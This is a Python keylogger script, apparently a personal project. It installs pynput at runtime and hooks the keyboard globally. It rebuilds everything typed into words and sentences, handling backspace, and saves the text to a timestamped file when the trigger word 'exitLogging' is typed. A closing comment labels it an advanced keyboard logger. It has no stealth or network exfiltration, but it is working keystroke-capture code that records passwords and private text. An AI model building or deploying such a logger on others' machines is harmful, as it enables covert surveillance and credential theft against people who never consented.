import subprocess

required_packages = ['pynput']

for package in required_packages:
    subprocess.call(['pip', 'install', package])

from pynput import keyboard
import datetime


toggle = False

lastKey = ""

stack = set()
sentences = list()
words = list()
characters = list()

def combineCharacters():
    global lastKey
    word = ""
    for c in characters:
        word += c
    word.strip()
    words.append(word)
    characters.clear()
    lastKey = 'Key.space'

def combineWords():
    global lastKey
    sen = ""
    for s in words:
        sen += s
        sen += ' '
    sen.strip()
    sentences.append(sen)
    words.clear()
    lastKey = 'Key.enter'

def fetchCharacters():
    global lastKey
    if(not len(words) == 0):
        word = words.pop()
        if(not len(word) == 0):
            for c in word:
                characters.append(c)
            lastKey = ''
        else:
            lastKey = 'Key.space'

def fetchWords():
    global words
    global lastKey
    if(not len(sentences) == 0):
        sen = sentences.pop()
        if(not len(sen) == 0):
            words = sen.split(' ')
            words.pop()
            fetchCharacters()
            lastKey = ''
        else:
            lastKey = 'Key.enter'

def on_press(key):
    global toggle
    global lastKey
    global characters
    global words
    global sentences
    global stack
    try:
        # print('Alphanumeric key {0} pressed'.format(key.char))
        characters.append(format(key.char))
        lastKey = ""
    except AttributeError:
        # print('Special key {0} pressed'.format(key))
        if format(key) == 'Key.caps_lock':
            toggle = not toggle
        elif format(key) == 'Key.enter':
            if(not len(characters) == 0):
                combineCharacters()
            combineWords()
        elif format(key) == 'Key.space':
            combineCharacters()
        elif format(key) == 'Key.backspace':
            if len(characters) == 0 :
                if lastKey == 'Key.space':
                    fetchCharacters()
                elif lastKey == 'Key.enter':
                    fetchWords()
            else:
                if not len(characters) == 0:
                    characters.pop()
                if len(characters) == 0 and len(words) == 0 and len(sentences) == 0:
                    lastKey = ''
                elif len(characters) == 0 and len(words) == 0:
                    lastKey = 'Key.enter'
                elif len(characters) == 0:
                    lastKey = 'Key.space'
        else:
            stack.add(format(key))
    # print(stack)
    # print(toggle)
    # print("\n\n\n\nPressed")
    # print('Sentences : ', sentences)
    # print('Words : ', words)
    # print('Characters : ', characters)

# def on_release(key):
#     global words
#     global characters
#     global sentences
#     try:
#         format(key.char)
#     except AttributeError:
#         stack.discard(format(key))
        
#     # print('{0} released'.format(key))
#     # if(key == keyboard.Key.esc):
#     #     return False
#     if(format(key) == 'Key.space'):
#         word = words.pop()
#         if(word == 'exitLogging'):
#             x = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + '.txt'
#             f = open(x,"w")
#             for sen in sentences:
#                 f.write(sen+'\n')
#             for word in words:
#                 f.write(word+' ')
#             f.close()
#             del characters
#             del words
#             del sentences
#             exit
#         else:
#             words.append(word)
    
#     print("\n\nRelease")
#     print('Sentences : ', sentences)
#     print('Words : ', words)
#     print('Characters : ', characters)

def on_release(key):
    global words
    global characters
    global sentences
    try:
        format(key.char)
    except AttributeError:
        stack.discard(format(key))

    if(format(key) == 'Key.space' or format(key) == 'Key.enter'):
        # Check if words list is not empty before popping
        if words: # Safer check than not len(words) == 0
            word = words.pop()
            if(word == 'exitLogging'):
                # FIX FOR FILENAME ERROR: Use strftime to create a valid filename
                # Example: YYYY-MM-DD_HH-MM-SS.txt
                timestamp_str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                filename = f"{timestamp_str}.txt" # Using an f-string for clarity

                try:
                    with open(filename, "w") as f:
                        for sen in sentences:
                            f.write(sen + '\n')
                        # Ensure remaining words are written, even if no sentence was completed
                        if words: # Check if there are words left
                            f.write(' '.join(words) + ' ') # Join remaining words with spaces
                        # Also, don't forget characters if any
                        if characters:
                            f.write(' '.join(characters)) # Assuming you want them space-separated
                except IOError as e:
                    print(f"Error writing to file {filename}: {e}")
                finally:
                    # Cleanup resources outside of the try block for certainty, or ensure they are properly handled
                    sentences.clear() # Use .clear() for lists, not del
                    words.clear()
                    characters.clear()
                    # It's better to explicitly return False or use sys.exit()
                    # if you intend to stop the listener.
                    # 'exit' by itself is not a function call.
                    return False # This will stop the keyboard listener
            else:
                words.append(word)
                



with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()


"""--------------------------------------------------------------------Tried using the pynput (Advanced keyboard logger - Not working for the wayland)------------------------------------------------------------------"""

